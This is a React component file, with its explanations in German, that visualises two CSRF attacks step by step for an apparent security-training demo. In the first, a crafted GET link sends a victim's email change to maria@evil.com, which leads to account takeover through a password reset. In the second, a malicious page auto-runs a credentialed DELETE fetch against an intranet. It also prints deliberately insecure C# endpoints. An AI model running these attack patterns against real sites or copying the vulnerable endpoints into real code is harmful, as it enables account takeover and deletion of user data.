import { Arrow, TraceBlock } from "@/components/CodeTrace"

// ---------------------------------------------------------------------------
// GetCsrfCodeTrace
// ---------------------------------------------------------------------------

/**
 * Code-Trace für das GET-CSRF-Szenario (E-Mail-Änderung via Link-Klick).
 *
 * Visualisiert den zweiphasigen Angriff:
 * - **Phase 1** (immer sichtbar nach Klick): Manipulierter GET-Link → Browser sendet
 *   Session-Cookie → vulnerabler Endpoint ändert E-Mail → lautlose Bestätigung
 * - **Phase 2** (nur wenn `phase === "takenOver"`): Passwort-Reset-Anfrage →
 *   Reset-Link landet im Angreifer-Postfach → Account vollständig übernommen
 *
 * @param phase - Aktuelle Phase der {@link GetCsrf}-Demonstration
 */
export function GetCsrfCodeTrace({ phase }: { phase: "idle" | "emailChanged" | "takenOver" }) {
  if (phase === "idle") {
    return (
      <p className="text-xs text-muted-foreground">
        Klicke auf den Link in der Phishing-Mail, um den Code-Ablauf zu sehen.
      </p>
    )
  }

  return (
    <div className="flex flex-col gap-3 text-xs">

      {/* ── Phase 1 ──────────────────────────────────────────────────── */}
      <p className="text-[10px] font-semibold uppercase tracking-wide text-muted-foreground">
        Phase 1 – E-Mail-Änderung
      </p>

      <TraceBlock step="①" label="Manipulierter Link (Angreifer)">
        {`GET https://app.firma.at/account/settings?email=maria%40evil.com`}
      </TraceBlock>

      <Arrow />

      <TraceBlock step="②" label="Browser folgt dem Link – sendet Session-Cookie automatisch mit">
        {`// SameSite=Lax: Cookies werden bei Top-Level-Navigation (GET) mitgeschickt
Cookie: session=alice_session_token

// Kein JavaScript nötig – ein einfacher Link reicht`}
      </TraceBlock>

      <Arrow />

      {/* ③ mit Tooltip */}
      <div className="flex flex-col gap-1">
        <div className="relative group w-fit">
          <p className="text-xs font-semibold text-muted-foreground cursor-help underline decoration-dotted underline-offset-2">
            <span className="mr-1">③</span>Vulnerabler GET-Endpoint ändert E-Mail ohne CSRF-Prüfung
          </p>
          <div className="absolute bottom-full left-0 mb-2 w-80 rounded-md bg-popover border border-border shadow-md px-3 py-2 text-xs text-popover-foreground invisible group-hover:visible z-50 leading-relaxed">
            <p className="font-semibold mb-1">Warum ist GET hier falsch?</p>
            <p>GET-Requests sollen laut HTTP-Spezifikation <span className="italic">idempotent</span> und <span className="italic">safe</span> sein – sie dürfen keinen serverseitigen Zustand verändern. Wird trotzdem eine E-Mail-Änderung per GET durchgeführt, reicht ein einziger Link-Klick für den Angriff.</p>
            <p className="mt-1">Zusätzlich fehlt jede CSRF-Token-Prüfung: Der Server vertraut dem Cookie blind, ohne zu prüfen, ob die Anfrage wirklich von der eigenen Seite stammt.</p>
          </div>
        </div>
        <pre className="bg-muted rounded p-2 text-xs overflow-x-auto whitespace-pre-wrap">{`// ⚠️ UNSICHER: GET-Endpoint verändert Serverzustand
[HttpGet("settings")]
public async Task<IActionResult> UpdateEmail(
    [FromQuery] string email)   // ← kommt direkt aus der URL
{
    // Kein CSRF-Token-Check
    // Kein Referer-Check
    var user = await GetCurrentUser();  // ← vertraut dem Session-Cookie
    user.Email = email;
    await db.SaveChangesAsync();
    return Ok();
}`}</pre>
      </div>

      <Arrow />

      <TraceBlock step="④" label="E-Mail lautlos auf maria@evil.com geändert">
        {`// Alice wurde nicht benachrichtigt.
// Sie sieht keine Fehlermeldung, keinen Alert.
// Der Angriff ist abgeschlossen – ohne dass Alice
// je auf "E-Mail ändern" geklickt hat.`}
      </TraceBlock>

      {/* ── Phase 2 ──────────────────────────────────────────────────── */}
      {(phase === "takenOver") && (
        <>
          <div className="border-t my-1" />
          <p className="text-[10px] font-semibold uppercase tracking-wide text-muted-foreground">
            Phase 2 – Account-Übernahme
          </p>

          <TraceBlock step="⑤" label="Maria fordert Passwort-Reset für alice_w an">
            {`POST https://app.firma.at/account/password-reset
Body: { "username": "alice_w" }

// Der Server schickt den Reset-Link an die
// hinterlegte E-Mail-Adresse – jetzt: maria@evil.com`}
          </TraceBlock>

          <Arrow />

          <TraceBlock step="⑥" label="Reset-Link landet in Marias Postfach">
            {`An: maria@evil.com
Betreff: Passwort zurücksetzen – app.firma.at

https://app.firma.at/reset?token=a9f3c2e1...`}
          </TraceBlock>

          <Arrow />

          <TraceBlock step="⑦" label="Maria setzt neues Passwort – Account übernommen">
            {`// Alice ist ausgesperrt.
// Maria hat vollen Zugriff auf den Account.
// Alice hat in keinem Schritt aktiv mitgewirkt.`}
          </TraceBlock>
        </>
      )}
    </div>
  )
}

// ---------------------------------------------------------------------------
// DeleteCsrfCodeTrace
// ---------------------------------------------------------------------------

/**
 * Code-Trace für das DELETE-CSRF-Szenario (Benutzer-Löschung via Malicious Page).
 *
 * Visualisiert vier Schritte:
 * 1. Malicious Page feuert automatisch `fetch("DELETE ...", credentials: "include")`
 * 2. Browser hängt Admin-Session-Cookie an den Request
 * 3. Vulnerabler DELETE-Endpoint ohne CSRF-Token-Check führt die Löschung aus
 * 4. Benutzer ist gelöscht, der Admin merkt nichts
 *
 * Zeigt Platzhalter-Text, solange `deleted === false`.
 *
 * @param deleted - `true` sobald der Link in {@link DeleteCrsf} geklickt wurde
 */
export function DeleteCsrfCodeTrace({ deleted }: { deleted: boolean }) {
  if (!deleted) {
    return (
      <p className="text-xs text-muted-foreground">
        Klicke auf den Link in der Phishing-Mail, um den Code-Ablauf zu sehen.
      </p>
    )
  }

  return (
    <div className="flex flex-col gap-3 text-xs">

      <TraceBlock step="①" label="Malicious Page – automatischer fetch() beim Laden">
        {`// Die verlinkte Seite führt diesen Code sofort aus:
fetch("https://intranet.firma.at/admin/users/42", {
  method: "DELETE",
  credentials: "include"   // ← Browser hängt Thomas' Cookie an
})`}
      </TraceBlock>

      <Arrow />

      <TraceBlock step="②" label="Browser sendet DELETE-Request mit Session-Cookie">
        {`DELETE /admin/users/42 HTTP/1.1
Host: intranet.firma.at
Cookie: session=thomas_admin_token   // ← automatisch angehängt
Origin: https://confirm-access.firma-helpdesk.com`}
      </TraceBlock>

      <Arrow />

      {/* ③ mit Tooltip */}
      <div className="flex flex-col gap-1">
        <div className="relative group w-fit">
          <p className="text-xs font-semibold text-muted-foreground cursor-help underline decoration-dotted underline-offset-2">
            <span className="mr-1">③</span>Vulnerabler DELETE-Endpoint – kein CSRF-Token-Check
          </p>
          <div className="absolute bottom-full left-0 mb-2 w-80 rounded-md bg-popover border border-border shadow-md px-3 py-2 text-xs text-popover-foreground invisible group-hover:visible z-50 leading-relaxed">
            <p className="font-semibold mb-1">Warum schützt kein CORS hier?</p>
            <p>CORS schützt nur vor dem <span className="italic">Lesen</span> der Antwort – nicht vor dem Ausführen der Aktion. Der Browser schickt den Request trotzdem ab; der Server verarbeitet ihn, bevor CORS greift.</p>
            <p className="mt-1">Interne Tools gelten oft als „sicher hinter der Firewall" – aber solange ein eingeloggter Mitarbeiter eine externe Mail öffnen kann, ist die Angriffsfläche offen.</p>
          </div>
        </div>
        <pre className="bg-muted rounded p-2 text-xs overflow-x-auto whitespace-pre-wrap">{`// ⚠️ UNSICHER: Kein CSRF-Token, kein Referer-Check
[HttpDelete("{id:int}")]
public async Task<IActionResult> Delete(int id)
{
    // Kein [ValidateAntiForgeryToken]
    // Kein Abgleich von X-CSRF-Token-Header
    var user = await db.Users.FindAsync(id);
    if (user is null) return NotFound();

    db.Users.Remove(user);
    await db.SaveChangesAsync();
    return NoContent();   // ← 204 – Benutzer gelöscht
}`}</pre>
      </div>

      <Arrow />

      <TraceBlock step="④" label="Sandra Weiss wurde gelöscht – Thomas merkt nichts">
        {`// HTTP 204 No Content
// Thomas sieht keine Fehlermeldung, kein Alert.
// Die Malicious Page hat die Aktion vollständig
// im Hintergrund ausgeführt.`}
      </TraceBlock>

    </div>
  )
}
